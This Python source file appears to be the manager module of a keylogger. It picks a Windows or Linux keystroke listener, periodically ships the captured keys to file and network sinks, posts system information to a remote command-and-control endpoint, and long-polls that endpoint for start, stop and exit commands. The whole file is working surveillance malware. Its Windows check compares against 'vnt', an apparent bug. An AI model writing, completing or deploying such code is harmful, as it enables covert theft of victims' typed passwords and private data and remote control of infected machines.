import logging
import os
import threading
import time
import requests
from typing import Protocol, Optional

from keylogger.file_writer import FileWriter
from keylogger.network_writer import NetworkWriter
from keylogger.sinker import Sinker
from keylogger.processor import Processor
from keylogger.listner import LinuxKeylogger, WindowsKeylogger, Listener
from keylogger.system_info import get_system_info

logger = logging.getLogger(__name__)


class Manager(Protocol):
    """
    Manager is a protocol that defines the interface for managing the keylogger.
    """

    sink: Sinker
    processor: Processor
    listner: Listener

    def start(self) -> None:
        """
        start the manager.
        """
        ...

    def stop(self) -> None:
        """
        stop the manager.
        """
        ...


class DefaultManager:
    """
    DefaultManager is a class that implements the Manager protocol.

    every 10 seconds, it gets the data from the listener, processes it using the processor,
    and then sinks the processed data using the sink.
    """

    def __init__(
        self,
        endpoint: str = "http://localhost:5000",
        log_path: Optional[str] = None,
        push_interval: int = 10,
    ):
        # Use WindowsKeylogger if the OS is Windows, otherwise use LinuxKeylogger
        if os.name == "vnt":
            keylogger = WindowsKeylogger()
        else:
            keylogger = LinuxKeylogger()

        self.processor = Processor("")
        self.endpoint = endpoint
        self.machine_id = self.processor.mac

        self.sink = []
        if log_path:
            self.sink.append(FileWriter(log_path))
        if self.endpoint:
            self.sink.append(NetworkWriter(self.endpoint))

        self.listner = keylogger
        self.interval = push_interval
        self._loop_thread = threading.Thread(target=self._loop)
        self._stopped = False

    def start(self) -> None:
        self.listner.start()
        self._loop_thread.start()
        self._stopped = False
        self._c2c_init()

    def stop(self) -> None:
        logger.debug("Stopping the manager")
        self.listner.stop()

        self._stopped = True
        if self._loop_thread and self._loop_thread.is_alive():
            self._loop_thread.join()

    def run(self) -> None:
        """
        Run the manager

        This function will start the manager, and then long-poll the C2C server
        for control commands.
        """
        ctrl = None

        while ctrl := self._c2c_ctrl(last=ctrl):
            logger.info(f"Received control command: {ctrl}")

            if ctrl == "exit":
                break
            if ctrl == "stop":
                self.stop()
            if ctrl == "start":
                self.start()

        if not self._stopped:
            print("Exiting... press Ctrl+C again to exit immediately")
            self.stop()

    def _loop(self):
        # the loop that gets the data from the listener, processes it, and then sinks it.
        while not self._stopped:
            data = self.listner.get_data()
            if data:
                processed_data = self.processor.process_data(data)
                for sink in self.sink:
                    sink.sink(processed_data)
            time.sleep(self.interval)

    def _c2c_init(self):
        # Initialize the connection to the C2C server
        if not self.endpoint:
            return False

        machine_info = {
            "id": "",
            "info": get_system_info(),
        }

        resp = requests.post(
            f"{self.endpoint}/machine",
            json=machine_info,
        )
        logger.info(f"Connected to the C2C server: {self.endpoint}")
        if resp.status_code != 200:
            logger.error(
                f"Failed to send machine info to the C2C server: {self.endpoint}"
            )
            return False
        return True

    def _c2c_ctrl(self, last=None):
        """
        Ctrl is a long-polling request to the C2C server to get the control command.
        """

        if not self.endpoint:
            return "exit"

        try:
            resp = requests.get(
                f"{self.endpoint}/ctrl",
                params={"last": last, "machine_id": self.machine_id},
            )
        except requests.exceptions.RequestException as e:
            logger.error(
                f"Failed to get the control command from the C2C server: {self.endpoint}",
                e,
            )
            return
        except KeyboardInterrupt:
            return "exit"

        if resp.status_code != 200:
            logger.error(
                f"Failed to get the control command from the C2C server: {self.endpoint}",
                resp.json(),
            )
            return "exit"

        return resp.json().get("ctrl", "exit")
